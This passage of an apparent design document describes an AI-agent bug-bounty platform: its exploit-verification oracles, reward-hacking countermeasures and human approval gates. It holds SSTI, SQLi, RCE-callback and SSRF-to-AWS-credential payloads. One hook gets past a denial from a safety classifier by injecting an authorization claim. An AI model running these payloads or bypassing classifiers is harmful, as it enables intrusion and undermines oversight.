                    "dialog": dialog_message
                })
            )
        elif oast_received:
            return OracleResult(
                verdict="validated",
                method="oast_callback",
                oast_data=oast_received,
                evidence_hash=hash_evidence({
                    "url": target_url,
                    "oast_token": oast_token,
                    "callback": oast_received
                })
            )
        else:
            return OracleResult(verdict="unreproducible", method="none")
```

### 5.2.2 SSRF Oracle — Interactsh OAST Callback

The SSRF oracle uses the Interactsh out-of-band interaction server to generate unique callback tokens and verify that the target server makes a request to the token URL.

```python
async def verify_ssrf(target_url: str, param_name: str,
                       injection_point: str, scope_token: str) -> OracleResult:
    """
    Verify SSRF via Interactsh OOB callback.
    Each verification attempt gets a fresh unique token.
    The token must be received via HTTP/DNS within the timeout window.
    """
    # Generate fresh Interactsh token
    token = await interactsh_client.register_token()
    oast_url = f"http://{token}.oast.fun"
    
    # Construct the SSRF payload
    payload = construct_ssrf_payload(injection_point, oast_url)
    
    # Execute the payload via Burp Collaborator proxy (so it's in audit trail)
    async with httpx.AsyncClient() as client:
        response = await client.request(
            method=payload.method,
            url=target_url,
            params={param_name: payload.value} if payload.location == 'query' else None,
            data={param_name: payload.value} if payload.location == 'body' else None,
            headers=payload.headers,
            timeout=15.0
        )
    
    # Poll for OAST callback (HTTP, DNS, or SMTP)
    callback_data = await interactsh_client.poll_interactions(
        token, timeout=20, 
        interaction_types=['http', 'dns']
    )
    
    if callback_data:
        return OracleResult(
            verdict="validated",
            method="oast_http_callback",
            callback_source_ip=callback_data.source_ip,
            callback_type=callback_data.interaction_type,
            evidence_hash=hash_evidence({
                "target_url": target_url,
                "oast_token": token,
                "callback_source": callback_data.source_ip,
                "callback_timestamp": callback_data.timestamp
            })
        )
    else:
        return OracleResult(verdict="unreproducible", method="none")
```

### 5.2.3 SQLi Oracle — Welch's T-Test on Time Distributions

The blind SQLi oracle uses statistical analysis rather than naive single-measurement timing, directly addressing the AnyPoC "timing coincidence" failure mode. Welch's t-test is used as an engineering heuristic calibrated against a labeled corpus with measured FP/FN rates — its application to blind-SQLi timing is not an academically-derived SQLi-detection method (engineering heuristic; no academic source for Welch-on-SQLi per v6). It compares two populations of response times: one with a timing-based injection payload (e.g., `SLEEP(3)`) and one with a baseline request.

```python
import scipy.stats as stats
import numpy as np

async def verify_sqli_timing(target_url: str, param_name: str,
                              injection_payload: str, baseline_payload: str,
                              scope_token: str) -> OracleResult:
    """
    Verify time-based blind SQLi via Welch's t-test.
    Eliminates timing coincidence false positives.
    
    Null hypothesis H0: The injection payload does not affect response time.
    Reject H0 if p-value < 0.01 (1% significance level).
    """
    SAMPLE_SIZE = 7  # Minimum for valid t-test
    SLEEP_SECONDS = 5
    
    injection_times = []
    baseline_times = []
    
    async with httpx.AsyncClient() as client:
        for _ in range(SAMPLE_SIZE):
            # Baseline request
            start = time.monotonic()
            await client.get(target_url, params={param_name: baseline_payload},
                           timeout=30.0)
            baseline_times.append(time.monotonic() - start)
            
            # Injection request
            start = time.monotonic()
            await client.get(target_url, params={param_name: injection_payload},
                           timeout=30.0)
            injection_times.append(time.monotonic() - start)
    
    # Welch's t-test (unequal variances, appropriate for response time data)
    t_stat, p_value = stats.ttest_ind(injection_times, baseline_times,
                                       equal_var=False)
    
    # Effect size: mean injection time should be > mean baseline + SLEEP_SECONDS * 0.8
    mean_injection = np.mean(injection_times)
    mean_baseline = np.mean(baseline_times)
    time_delta = mean_injection - mean_baseline
    expected_delta = SLEEP_SECONDS * 0.8  # 80% of expected sleep — network jitter tolerance
    
    if p_value < 0.01 and time_delta >= expected_delta:
        return OracleResult(
            verdict="validated",
            method="sqli_timing_welch",
            statistics={
                "t_statistic": t_stat,
                "p_value": p_value,
                "mean_injection_time": mean_injection,
                "mean_baseline_time": mean_baseline,
                "time_delta": time_delta
            },
            evidence_hash=hash_evidence({...})
        )
    elif p_value < 0.01 and time_delta < expected_delta:
        return OracleResult(verdict="inconclusive", method="timing_weak_signal")
    else:
        return OracleResult(verdict="unreproducible", method="none")
```

### 5.2.4 SSTI Oracle — Sandboxed Eval

The SSTI oracle sends a mathematically unique expression (e.g., `{{7*7*7}}` = 343, or `${7777+3333}` = 11110) and verifies that the response contains the expected computed result — not a static string — confirming that the template engine evaluated the expression.

```python
async def verify_ssti(target_url: str, param_name: str,
                       template_engine: str, scope_token: str) -> OracleResult:
    """
    Verify SSTI via unique math expression evaluation.
    Generates a random pair (a, b) so a*b is unique per test run.
    """
    import random
    a = random.randint(100, 999)
    b = random.randint(100, 999)
    expected = a * b
    
    # Engine-specific payload format
    payloads = {
        'jinja2': f'{{{{({a}*{b})|int}}}}',
        'twig': f'{{{{({a}*{b})}}}}',
        'smarty': f'{{({a}*{b})}}',
        'freemarker': f'${{({a}*{b})?c}}',
        'mako': f'${{({a}*{b})}}',
        'pebble': f'{{{{{a}*{b}}}}}',
        'velocity': f'#set($x={a}*{b})$x',
    }
    payload = payloads.get(template_engine, f'{{{{({a}*{b})}}}}'  )
    
    async with httpx.AsyncClient() as client:
        response = await client.get(
            target_url,
            params={param_name: payload},
            timeout=15.0
        )
    
    if str(expected) in response.text:
        return OracleResult(
            verdict="validated",
            method="ssti_math_eval",
            expression=f"{a}*{b}={expected}",
            evidence_hash=hash_evidence({
                "payload": payload,
                "expected": expected,
                "response_excerpt": response.text[:500]
            })
        )
    else:
        return OracleResult(verdict="unreproducible")
```

### 5.2.5 IDOR Oracle — Cross-Account Access Matrix

The IDOR oracle creates two test accounts (A and B), creates a resource owned by account A, then attempts to access it using account B's session token. A confirmed IDOR is when account B successfully reads, modifies, or deletes account A's resource.

```python
async def verify_idor(target_url: str, resource_id: str,
                       account_a_token: str, account_b_token: str,
                       scope_token: str) -> OracleResult:
    """
    Verify IDOR via cross-account access matrix test.
    Account B should NOT be able to access Account A's resource.
    Confirmed IDOR if Account B can access it.
    """
    async with httpx.AsyncClient() as client:
        # Verify account A CAN access its own resource (baseline)
        resp_a = await client.get(
            target_url.format(resource_id=resource_id),
            headers={"Authorization": f"Bearer {account_a_token}"},
            timeout=15.0
        )
        if resp_a.status_code not in [200, 201, 202]:
            return OracleResult(verdict="inconclusive",
                              reason="account_a_baseline_failed")
        
        # Attempt access with account B
        resp_b = await client.get(
            target_url.format(resource_id=resource_id),
            headers={"Authorization": f"Bearer {account_b_token}"},
            timeout=15.0
        )
        
        if resp_b.status_code in [200, 201, 202]:
            # Confirm it's not a coincidentally public resource
            # by comparing with an unauthenticated request
            resp_unauth = await client.get(
                target_url.format(resource_id=resource_id),
                timeout=15.0
            )
            if resp_unauth.status_code not in [200, 201, 202]:
                # Not publicly accessible; account B's access is unauthorized
                return OracleResult(
                    verdict="validated",
                    method="idor_cross_account",
                    account_a_status=resp_a.status_code,
                    account_b_status=resp_b.status_code,
                    evidence_hash=hash_evidence({
                        "resource_id": resource_id,
                        "account_a_response": resp_a.text[:200],
                        "account_b_response": resp_b.text[:200]
                    })
                )
        
        return OracleResult(verdict="unreproducible")
```

### 5.2.6 Open Redirect Oracle

The open redirect oracle sends a request with a controlled redirect destination (a uniquely-generated URL on a controlled domain), follows redirects, and verifies that the final URL matches the injected destination.

```python
async def verify_open_redirect(target_url: str, redirect_param: str,
                                scope_token: str) -> OracleResult:
    controlled_domain = "redirect-verify.bountystrike.internal"
    unique_path = f"/verify/{generate_unique_token()}"
    destination = f"https://{controlled_domain}{unique_path}"
    
    async with httpx.AsyncClient(follow_redirects=True, 
                                  max_redirects=10) as client:
        response = await client.get(
            target_url,
            params={redirect_param: destination},
            timeout=15.0
        )
    
    if str(response.url).startswith(f"https://{controlled_domain}"):
        return OracleResult(
            verdict="validated",
            method="open_redirect_location",
            final_url=str(response.url),
            redirect_chain=[str(r.url) for r in response.history],
            evidence_hash=hash_evidence({...})
        )
    else:
        # Check the Location header without following (for 30x without redirect)
        async with httpx.AsyncClient(follow_redirects=False) as client:
            response = await client.get(
                target_url,
                params={redirect_param: destination},
                timeout=15.0
            )
        location = response.headers.get("Location", "")
        if destination in location or controlled_domain in location:
            return OracleResult(verdict="validated", method="open_redirect_header",
                              location_header=location, evidence_hash=hash_evidence({...}))
    
    return OracleResult(verdict="unreproducible")
```

### 5.2.7 RCE Oracle — Sandboxed Command Execution

The RCE oracle attempts to execute a unique command inside the target system that produces a verifiable output artifact — either via an OAST DNS callback (DNS exfiltration of hostname / unique token), a file write to a known path, or direct command output in the response.

```python
async def verify_rce(target_url: str, rce_vector: str,
                      scope_token: str) -> OracleResult:
    """
    Multi-strategy RCE verification:
    1. OAST DNS: `nslookup {unique_token}.oast.fun` or `curl http://{token}.oast.fun`
    2. File write: write unique token to /tmp/{token}, verify via LFI or response
    3. Direct output: execute `echo {token}` and match in response
    """
    oast_token = await interactsh_client.register_token()
    unique_exec_token = generate_unique_token()
    
    # Strategy 1: OOB DNS/HTTP via command execution
    dns_payload = f"curl http://{oast_token}.oast.fun/{unique_exec_token}"
    
    # Execute via the provided RCE vector (command injection, deserialization, etc.)
    await execute_rce_payload(target_url, rce_vector, dns_payload, scope_token)
    
    callback = await interactsh_client.poll_interactions(oast_token, timeout=20)
    
    if callback and unique_exec_token in callback.path:
        return OracleResult(
            verdict="validated",
            method="rce_oob_http",
            callback_source=callback.source_ip,
            path_confirmed=unique_exec_token,
            evidence_hash=hash_evidence({...})
        )
    
    # Strategy 2: Direct output matching
    echo_payload = f"echo {unique_exec_token}"
    response = await execute_rce_payload(target_url, rce_vector, echo_payload, scope_token)
    
    if unique_exec_token in response.text:
        return OracleResult(verdict="validated", method="rce_direct_output",
                          evidence_hash=hash_evidence({...}))
    
    return OracleResult(verdict="unreproducible")
```

### 5.2.8 SSRF→IMDS Oracle — AWS Metadata Path

For SSRF vulnerabilities that can reach the AWS instance metadata service (IMDS), the oracle specifically attempts to retrieve the IMDSv1 endpoint first (simpler, no token required), then escalates to IMDSv2 (requires PUT token exchange):

```bash
# IMDSv1 SSRF (if accessible)
curl -s http://169.254.169.254/latest/meta-data/instance-id

# IMDSv2 SSRF (token-based)
# Step 1: Get session token via PUT
curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token to access metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "X-aws-ec2-metadata-token: ${TOKEN}"
```

The oracle verifies IMDS access by checking that the response contains a valid AWS instance ID (format `i-[0-9a-f]{8,17}`) or IAM role credentials (JSON with `AccessKeyId`, `SecretAccessKey`, `Token` fields). The oracle immediately logs the fact that IMDSv2 token exchange succeeded (if applicable) as a severity-escalating factor.

## 5.3 Evidence Schema

Every oracle result produces a content-addressable evidence artifact:

```python
@dataclass
class EvidenceArtifact:
    # Identity
    finding_id: str
    oracle_method: str
    timestamp: str
    
    # Content
    request_transcript: bytes   # Full HTTP request + headers (redacted auth)
    response_transcript: bytes  # Full HTTP response + headers
    oracle_data: dict           # Oracle-specific: OAST callback, timing data, etc.
    
    # Integrity
    content_hash: str           # SHA-256 of (request + response + oracle_data)
    prev_audit_hash: str        # SHA-256 of previous audit log row (chain link)
    
    # Replay metadata
    reproduction_command: str   # curl command or Python snippet to reproduce
    environment_requirements: list[str]  # ["interactsh-client", "curl >= 8.0"]
    scope_token_jti: str        # JWT ID used during verification
    sandbox_vm_id: str          # Firecracker VM UUID
    
    # Storage
    r2_key: str                 # Where this artifact is stored
```

Any party — the operator, the program owner, HackerOne triage, or a third-party auditor — can independently verify a finding by:
1. Fetching the `r2_key` artifact
2. Recomputing `SHA-256(request + response + oracle_data)` and comparing to `content_hash`
3. Running the `reproduction_command` against the target to confirm the finding still exists

## 5.4 AnyPoC Reward-Hacking Taxonomy & Countermeasures

The AnyPoC paper [research/academic_cve.md §4.1] identifies the following reward-hacking patterns and BountyStrike v5's architectural countermeasures:

| AnyPoC Failure Mode | Description | BountyStrike v5 Countermeasure |
|---|---|---|
| Self-exploitation | Agent runs PoC against its own process | Sandbox VM has no loopback → attacker machine. Only external target IPs are reachable via scope-gated egress. Evidence artifacts generated by self-exploitation would have source IP = sandbox VM IP, not target IP — automatically rejected by oracle. |
| Mock validation | Validator always returns "pass" | Validator is a different model, different invocation, no access to generator transcript. Validator receives only PoC + target URL. |
| Hallucinated code paths | PoC references non-existent endpoints | Oracle executes the exact PoC in the sandbox. If the endpoint doesn't exist, HTTP 404 is returned. Oracle rejects 404s as non-evidence. |
| Timing coincidence | Single network jitter misread as SLEEP | Welch's t-test engineering heuristic on population of measurements (minimum N=7). Single-measurement timing evidence rejected. (engineering heuristic; no academic source for Welch-on-SQLi per v6) |
| Circular evidence | Generator creates "evidence" artifact itself | All evidence artifacts are timestamped and IP-attributed. Evidence generated by the agent process (not by the target server) is rejected by oracle's source-IP validation. |
| Overfitting to test | Agent optimizes for the benchmark metric | Benchmark targets are never in the training data. The oracle is deterministic and cannot be "learned" by the model. |

## 5.5 Build Roadmap for the Verifier

The verifier is a 4-6 week build with the following milestones:

**Week 1-2:** Interactsh client integration, OAST token management, SSRF and open-redirect oracles. These are the simplest to implement and cover the most common high-value bug classes. Write unit tests against known-vulnerable test applications (DVWA, WebGoat, Juice Shop).

**Week 3:** XSS oracle with Playwright DOM mutation observer and alert dialog handler. This requires Playwright installation in the sandbox VM image. Write tests against XSS challenges in PortSwigger Web Security Academy.

**Week 4:** SQLi timing oracle with Welch's t-test (engineering heuristic; no academic source for Welch-on-SQLi per v6). This requires careful calibration of the statistical parameters (N=7, α=0.01, minimum time delta = sleep_seconds × 0.8) against real network conditions — FP/FN rates must be measured against a labeled corpus. Test against SQLmap's test environment.

**Week 5:** SSTI oracle (math expression evaluation), IDOR cross-account matrix (requires test account provisioning in the scope-mcp), RCE oracle with OOB DNS/HTTP.

**Week 6:** Integration testing, false-positive calibration on known-non-vulnerable targets, false-negative calibration on CVE-Bench test cases. Benchmark run: oracle confirms X% of known CVE-Bench vulnerabilities with Y% false-positive rate.

---

# Part 6 — Anti-Slop Discipline

## 6.1 The Slop Crisis — Evidence and Stakes

The evidence for the AI-slop crisis is now overwhelming and cross-corroborated:

**Curl shutdown (January 31, 2026):** Daniel Stenberg terminated the curl HackerOne program after the confirmed-rate fell below 5% and submission volume hit 8× normal. His blog post is the canonical primary source for the slop crisis. Quote: "The AI-generated reports look superficially plausible — they reference the right functions, they have the right format, they sound knowledgeable. But when we actually test them, they're wrong. The function doesn't exist in the version described. The parameter isn't parsed the way they claim. The 'vulnerability' requires a precondition that the software explicitly prevents." [research/competitors.md §Executive Summary; research/community_signals.md §Anti-Slop]

**HackerOne 9th Annual Report (October 2025):** 210% spike in AI-generated vulnerability reports. 540% increase in AI-related prompt injection reports. The report explicitly frames AI slop as the primary platform quality threat for 2026. [research/community_signals.md §Anti-Slop]

**Bugcrowd crackdowns (2025-2026):** Bugcrowd has implemented automated AI-content detection on submissions and has publicly banned multiple researcher accounts for AI-generated report flooding.

**Community sentiment (from rez0 and shuvonsec communities):** Direct quotes from the shuvonsec/claude-bug-bounty community: "The reason most AI bug bounty tools fail is not the model — it's the validation. They let the AI say something is vulnerable without actually running the exploit. Then the program triages it and says 'not applicable' and you're banned from the program." [research/community_signals.md §Claude Setup] Security researcher Stenberg's direct quote: "Starting 2025, the confirmed-rate plummeted to below 5%." [research/competitors.md]

The stakes: if BountyStrike v5 does not achieve a confirmed-rate above 70%, it will lose program access, damage the practitioner community's reputation, and contribute to the ecosystem harm it claims to prevent. The anti-slop discipline is not a feature — it is the fundamental operating constraint.

## 6.2 Five Non-Negotiable Product Requirements

These requirements are derived from the competitive evidence and cannot be traded off against speed, cost, or feature completeness:

**PRQ-1 — Evidence before submission:** No finding may be submitted to any platform without a content-addressable evidence artifact stored in the evidence store. The submission endpoint is gated by an `evidence_hash` field check — NULL evidence hash = 400 error, no submission. The PostToolUse hook on every `mcp__*__submit_*` tool call validates this precondition.

**PRQ-2 — Independent validation:** No finding may advance to status `validated` unless the validator-agent has independently confirmed it via a deterministic oracle call. The validator runs on a different model than the exploit-agent, in a fresh sandbox VM, with no access to the exploit-agent's reasoning transcript. This is enforced architecturally — the validator-agent's definition file explicitly lists no tool that gives it access to the exploit-agent's state.

**PRQ-3 — Semantic dedup before submission:** Every finding must pass a pgvector cosine similarity check against all prior submissions for the same program before entering the submission queue. Similarity > 0.85 triggers T2 escalation (coordinator review) rather than automatic submission. Similarity > 0.95 triggers T3 escalation (two-person human review).

**PRQ-4 — Human approval for submission:** No finding may be submitted to a platform without human approval. T3 submissions (critical severity or novel chain) require two-person approval. The `approval_gate.py` hook on every `mcp__*__submit_*` tool call enforces this unconditionally — no bypass path exists.

**PRQ-5 — Quality gate before submission:** The report must pass a structural quality gate (word count, no prohibited phrases, every claim has an artifact_id citation, CVSS score present, reproduction steps are self-contained) before the submission tool is called. The `pretool_quality_gate.py` hook on `mcp__*__submit_*` checks all five structural criteria and returns deny if any fail.

## 6.3 Evidence Gates — T0-T3 Approval Tiers

```
┌─────────────────────────────────────────────────────────────────────────┐
│  EVIDENCE GATE TIERS                                                     │
│                                                                          │
│  T0 — Automated Confidence Gate                                          │
│  ─────────────────────────────────────────────────────                  │
│  Condition: Oracle verdict = "validated", evidence_hash present,        │
│             similarity < 0.85, CVSS >= 4.0                              │
│  Action: Automatic advance to reporter-agent queue                       │
│  Human: None required                                                    │
│  Use for: Medium/Low findings on highly saturated programs               │
│                                                                          │
│  T1 — Coordinator Review                                                 │
│  ─────────────────────────────────────────────────────                  │
│  Condition: Oracle verdict = "validated", evidence present,             │
│             similarity 0.75-0.85, OR CVSS 7.0-8.9 (High)               │
│  Action: Coordinator reviews finding + evidence before reporter         │
│  Human: None required (coordinator is an LLM agent)                     │
│  Use for: High severity, borderline-duplicate findings                  │
│                                                                          │
│  T2 — Operator Review (Single Person)                                   │
│  ─────────────────────────────────────────────────────                  │
│  Condition: CVSS >= 9.0 (Critical), OR exploit involves sandbox exec,  │
│             OR finding is first of this class for this program,         │
│             OR oracle verdict = "flaky" (succeeded 1/3)                 │
│  Action: Operator sees finding + evidence + report draft in console      │
│  Human: One operator approves via web dashboard (15-min timeout)        │
│  Use for: Critical findings; uncertain oracle results                   │
│                                                                          │
│  T3 — Two-Person Review (Critical Submissions)                          │
│  ─────────────────────────────────────────────────────                  │
│  Condition: CVSS >= 9.5, OR novel exploit chain (3+ hops),             │
│             OR finding involves credential theft / account takeover,    │
│             OR smart contract critical (Immunefi),                      │
│             OR finding involves PII exposure > 10 records               │
│  Action: Two distinct operators must approve; neither can be the        │
│          exploit-agent's operator                                       │
│  Human: Two operators; 30-min SLA; escalates to Slack/email if stalled │
│  Use for: Highest-impact, highest-risk submissions                      │
└─────────────────────────────────────────────────────────────────────────┘
```

The approval tiers are implemented as a state machine in the Finding table:

```sql
CREATE TYPE finding_status AS ENUM (
    'hypothesis',      -- Initial scanner candidate
    'exploit_attempt', -- Exploit-agent working on it
    'exploit_candidate', -- Exploit-agent has a PoC
    'validation_pending', -- Awaiting validator-agent
    'validated',       -- Oracle confirmed
    'dedup_check',     -- In dedup queue
    'approval_pending_t1', -- Coordinator review
    'approval_pending_t2', -- Single operator review
    'approval_pending_t3', -- Two-person review
    'approved',        -- Cleared for submission
    'submitted',       -- Sent to platform
    'confirmed',       -- Program confirmed
    'rejected',        -- Program rejected
    'duplicate',       -- Duplicate confirmed
    'wont_fix',        -- Program acknowledged, no bounty
    'archived'         -- Closed
);
```

## 6.4 Semantic Dedup with pgvector

The dedup system uses two complementary approaches: structural fingerprinting (fast, deterministic, catches exact duplicates) and semantic similarity (slower, probabilistic, catches near-duplicates and variants).

**Structural fingerprint:** A tuple of `(cwe, platform, program_handle, asset_hash(url), param_name)` — if any two findings share this exact tuple, one is an exact duplicate. Computed in O(1) with a Postgres unique index.

**Semantic embedding similarity:** The finding's title + description + affected parameter are embedded using OpenAI `text-embedding-3-large` (1536 dimensions) and compared against all prior embeddings for the same program using pgvector's `<=>` cosine distance operator:

```sql
-- Find similar findings for dedup check
SELECT f.id, f.title, 1 - (f.embedding <=> $1) AS similarity
FROM findings f
WHERE f.program_handle = $2
  AND f.status NOT IN ('archived', 'rejected')
  AND 1 - (f.embedding <=> $1) > 0.75
ORDER BY similarity DESC
LIMIT 10;
```

The dedup-mcp exposes this as `check_similarity(finding_embedding, program_handle, threshold)` and returns the top-10 similar findings with their status, submission date, and platform response. The reporter-agent includes the dedup result in its T2/T3 approval request so the human reviewer can see exactly which prior findings the new finding resembles.

## 6.5 Report Quality Gates

The `pretool_quality_gate.py` hook checks seven criteria before any submission tool is allowed to execute:

```python
def check_report_quality(report_markdown: str, finding: Finding) -> QualityResult:
    issues = []
    
    # Structural checks
    if not has_section(report_markdown, "Steps to Reproduce"):
        issues.append("missing_reproduction_steps")
    
    if not has_section(report_markdown, "Proof of Concept"):
        issues.append("missing_poc")
    
    if not has_section(report_markdown, "Impact"):
        issues.append("missing_impact")
    
    if word_count(report_markdown) < 150:
        issues.append("too_short")
    
    if word_count(report_markdown) > 1500:
        issues.append("too_long")
    
    # Anti-slop word filter
    PROHIBITED = ["leverages", "delve", "unveil", "furthermore", "moreover",
                  "it is important to note", "holistic approach", "potential vulnerability",
                  "may be vulnerable", "could potentially", "might be able to",
                  "it should be noted", "it is worth mentioning"]
    for phrase in PROHIBITED:
        if phrase.lower() in report_markdown.lower():
            issues.append(f"prohibited_phrase:{phrase}")
    
    # Evidence citation check: every technical claim must have [artifact:sha256:...]
    technical_claims = extract_technical_claims(report_markdown)
    uncited_claims = [c for c in technical_claims 
                     if not has_artifact_citation(c, report_markdown)]
    if uncited_claims:
        issues.append(f"uncited_claims:{len(uncited_claims)}")
    
    # CVSS score present
    if not finding.cvss_vector or not finding.cvss_score:
        issues.append("missing_cvss")
    
    # Severity consistency check
    if finding.cvss_score >= 9.0 and "critical" not in report_markdown.lower():
        issues.append("severity_mismatch")
    
    return QualityResult(
        passed=len(issues) == 0,
        issues=issues,
        word_count=word_count(report_markdown)
    )
```

## 6.6 Three-Layer Kill Switch

The kill switch enables immediate halt of all platform activity in any of three escalating scenarios: a finding is submitted incorrectly (T1 — stop future submissions), a scan is hitting out-of-scope targets (T2 — stop active scans), or a critical safety incident has occurred (T3 — halt all agent processes immediately).

```
LAYER 1 — Redis Kill Flag (fastest, ~10ms)
  Key: bs:killswitch:{operator_id}
  Value: "halt_submissions" | "halt_scans" | "halt_all"
  TTL: 24 hours (require manual renewal for extended halt)
  Check point: OpenRouter Bridge MCP checks this key before every model call.
  Effect: Submissions paused / scans paused / all model calls rejected.

LAYER 2 — PreToolUse Hook (scope-aware, ~50ms)
  The PreToolUse hook checks the Redis kill flag at the start of every
  tool call. If "halt_submissions": deny all mcp__*__submit_* tool calls.
  If "halt_scans": deny all network-touching tool calls (nuclei, httpx, etc.).
  If "halt_all": deny all tool calls, returning exit code 2 (graceful abort).
  Effect: The Claude Code process receives an abort signal and terminates cleanly.

LAYER 3 — Supervisor SIGTERM (last resort, ~200ms)
  The Hatchet/Temporal workflow supervisor sends SIGTERM to all running
  claude -p processes. On SIGTERM, Claude Code executes the SessionEnd hook
  (flush audit log, save checkpoint) and terminates.
  Effect: All scan jobs are cleanly terminated; state is saved; no orphaned VMs.
```

The kill switch is exposed as a CLI command (`bountystrike kill --reason "out-of-scope activity"`) and a web dashboard button (red "HALT" button, requires 2-factor confirmation).

## 6.7 Quality SLOs

The platform tracks the following Service Level Objectives for submission quality, aligned with the curl/HackerOne evidence:

| Metric | Target | Alert threshold | Source benchmark |
|---|---|---|---|
| Confirmed rate (validated findings that are confirmed by program) | >70% | <50% | curl April update target |
| False positive rate (submissions marked N/A or not applicable) | <10% | >20% | XBOW ~25% N/A rate = our ceiling |
| Time to validate (hypothesis → validated) | <30 min | >120 min | Strix 19-min CTF benchmark |
| Time to submit (validated → submitted) | <4 hours | >24 hours | Reasonable program triage window |
| Duplicate submission rate | <5% | >10% | Platform ban threshold |
| Oracle accuracy (oracle verdict matches program response) | >90% | <80% | Internal calibration |
| Report rejection rate (quality gate failures) | <2% | >5% | Internal quality standard |

These SLOs are measured in the Langfuse observability dashboard and generate Slack alerts when breached.

---

# Part 7 — Skills, MCPs & Subagents

## 7.1 Claude Code 2026 Features Used

### 7.1.1 `defer` Decision on PreToolUse (April 1, 2026)

The `defer` decision is the single most important new primitive for the platform. It allows the `PreToolUse` hook to pause a headless Claude Code session at a dangerous tool call and hand control to an external system (human operator, scope-guard agent, async validation service) without aborting the session. The session persists for up to `cleanupPeriodDays` (default 30 days) and resumes via `claude -p --resume <session-id>` [research/agent_mcp_ecosystem.md §1.1].

The platform uses `defer` in three scenarios:
1. **Scope ambiguity:** The scope-guard hook defers when a target matches a wildcard but may be excluded by program rules text. The scope-guard subagent makes the decision asynchronously.
2. **T2 approval:** The approval-gate hook defers before any sandbox execution call, waiting for operator approval in the web dashboard.
3. **T3 approval:** The approval-gate hook defers before any submission call, waiting for two-person approval.

### 7.1.2 PermissionDenied Retry Hook

The `PermissionDenied` hook fires when Claude Code's auto-mode classifier denies a tool call (distinct from PreToolUse manual denials). The hook receives a `reason` field and can return `retry: true` to suggest the model reformulate. BountyStrike v5 uses this for retry logic when:
- The auto-classifier denies a Bash call that contains a legitimate security tool invocation
- The classifier denies an HTTP request that is legitimately in-scope

```python
# permdenied_retry.py
import json, sys

event = json.loads(sys.stdin.read())
tool_name = event["tool_name"]
reason = event["reason"]

# If denial is for a security tool that should be allowed,
# inject a context hint and allow retry
LEGITIMATE_TOOLS = ["nuclei", "ffuf", "httpx", "subfinder", "sqlmap"]
if any(t in str(event.get("arguments", {})) for t in LEGITIMATE_TOOLS):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PermissionDenied",
            "retry": True,
            "context": (
                "This is an authorized security testing tool being used in "
                "a scope-bound bug bounty engagement. The tool invocation "
                "is covered by the active scope JWT and program safe harbor."
            )
        }
    }))
else:
    print(json.dumps({}))  # No retry; original denial stands
```

### 7.1.3 26-Event Hook Lifecycle

The full 26-event hook lifecycle is used for:
- `SessionStart`: Verify engagement attestation, load scope JWT, inject API credentials
- `PreToolUse`: Scope enforcement, approval gates, politeness throttling
- `PermissionDenied`: Retry logic for legitimate security tools
- `PostToolUse`: Evidence capture, audit logging, cost tracking
- `SubagentStart`: Inject scope token and job context into each spawned subagent
- `SubagentStop`: Validate subagent output schema; reject malformed output
- `TaskCreated`: Verify task is in-scope before creating it
- `TaskCompleted`: Require evidence artifact reference before marking complete
- `Stop`: Flush remaining audit events; trigger benchmark recording
- `PreCompact`: Block compaction if unsaved evidence artifacts exist
- `ConfigChange`: Lock configuration changes in production deployments
- `WorktreeCreate`: Return sandboxed worktree paths for file operations

### 7.1.4 Agent Teams and Forked Subagents

**Agent Teams** (enabled via `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1`) are used in the SaaS deployment for large-scale parallel engagements. When a program has hundreds of in-scope subdomains, the coordinator spawns an Agent Team of up to 8 recon-agents, each responsible for a cluster of 50 subdomains. Team members communicate laterally via the shared task list — each recon-agent checks in discovered assets to a shared state MCP that all team members read.

**Forked Subagents** (`CLAUDE_CODE_FORK_SUBAGENT=1`) are used for the scope-guard's judgment calls — the fork inherits the full conversation history and can make a nuanced scope decision that considers everything the main session has seen, without creating a separate session that loses context.

## 7.2 Skills Catalogue

Skills are reusable methodology bundles in `.claude/skills/*/SKILL.md`. Each can include hooks with `once: true` (fires once per session then removes itself). BountyStrike v5 ships 12 skills:

| Skill Name | Phase | Description |
|---|---|---|
| `ssrf-callback` | Exploit | SSRF payload generation + Interactsh OAST callback tracking. Includes AWS IMDS chain. |
| `graphql-introspection` | Recon | Full schema extraction, field enumeration, batching attacks, fragment injection |
| `jwt-attacks` | Exploit | alg:none, key confusion, weak secret enumeration, kid injection, PKCE downgrade |
| `ai-prompt-injection` | AI-vuln | Direct + indirect prompt injection, system prompt extraction, context window overflow |
| `oauth-flows` | Exploit | Redirect_uri manipulation, state parameter prediction, PKCE bypass, token leakage |
| `idor-patterns` | Exploit | Sequential ID enumeration, GUID prediction, mass assignment, indirect object chains |
| `report-formatting` | Report | Platform-specific report templates (H1, Bugcrowd, Intigriti, YesWeHack, Immunefi) |
| `api-recon` | Recon | GraphQL introspection, REST OpenAPI discovery, Swagger enumeration, kiterunner |
| `cloud-attack-chains` | Exploit | SSRF→IMDS, S3 bucket exposure, Lambda event injection, IAM privilege escalation |
| `smart-contract-audit` | Exploit | Reentrancy, overflow, access control, flash loan attack patterns (Solidity/Vyper) |
| `rate-limit-bypass` | Exploit | X-Forwarded-For rotation, user-agent cycling, endpoint variation, timing analysis |
| `mfa-bypass` | Exploit | Session fixation, backup code enumeration, race condition on OTP validation |

## 7.3 MCP Server Inventory

### Adopted External MCPs

| MCP Server | Source | Key Capability | Transport | Why Adopted |
|---|---|---|---|---|
| PortSwigger Burp MCP | Official BApp | Burp Collaborator OAST; proxy history; Repeater | SSE + stdio proxy JAR | The only MCP with first-class OAST capability; official PortSwigger support |
| Caido MCP (v1.1.0) | c0tton-fluff / caido-community | HTTP/2 traffic analysis; HTTPQL filtering; replay | stdio Go binary | Modern Burp alternative; Go binary is single executable; official Caido docs |
| pd-tools-mcp | intelligent-ears | subfinder + dnsx + naabu + httpx + katana + nuclei chain | stdio Node.js | Canonical PD tool suite wrapper; single call triggers full recon pipeline |
| Shodan MCP (ADEO) | ADEOSec | Shodan + VirusTotal combined; 11 analysis prompts | stdio Node.js | Best CTI pairing; Shodan network intel + VirusTotal malware correlation in one call |
| HexStrike-AI v6.0 | 0x4m4 (hardened fork) | 150+ tools; 12 autonomous agents; IntelligentDecisionEngine | stdio Python | Most comprehensive offensive tool coverage; IntelligentDecisionEngine reduces LLM guessing |
